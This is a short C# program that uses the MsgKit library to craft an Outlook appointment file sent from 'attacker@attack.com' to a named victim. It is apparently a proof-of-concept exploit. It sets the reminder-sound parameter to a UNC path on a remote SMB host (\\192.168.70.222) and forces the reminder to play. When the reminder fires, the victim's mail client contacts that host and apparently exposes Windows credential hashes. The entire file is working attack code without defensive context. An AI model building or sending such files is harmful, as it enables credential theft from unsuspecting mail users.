using System;
using System.Collections.Generic;
using System.IO;
using MsgKit;
using MsgKit.Enums;

class Sample
{
    public static void Main()
{
    using (var appointment = new Appointment(
    new Sender("attacker@attack.com", "attacker"),
    new Representing("attacker@attack.com", "attacker"), "Testing Appointment"))
    {

        appointment.Recipients.AddTo("victim@victim.com", "Ahmed Khlief");
        appointment.Subject = "test";
        appointment.Location = "test";
        appointment.MeetingStart = DateTime.Now.Date;
        appointment.MeetingEnd = DateTime.Now.Date.AddDays(1).Date;
        appointment.AllDay = true;
        appointment.BodyText = "Hello, thanks for your tume";
        appointment.BodyHtml = "<html><head></head><body><b>Hello, thanks for your time </b></body></html>";
        appointment.SentOn = DateTime.UtcNow;
        appointment.Importance = MsgKit.Enums.MessageImportance.IMPORTANCE_NORMAL;
        appointment.IconIndex = MsgKit.Enums.MessageIconIndex.UnsentMail;
        appointment.PidLidReminderFileParameter = @"\\192.168.70.222\foobar";
        appointment.PidLidReminderOverride = true;
            appointment.PidLidReminderPlaySound = true;
            appointment.Save(@"c:/appointment.msg");
    }

}

}
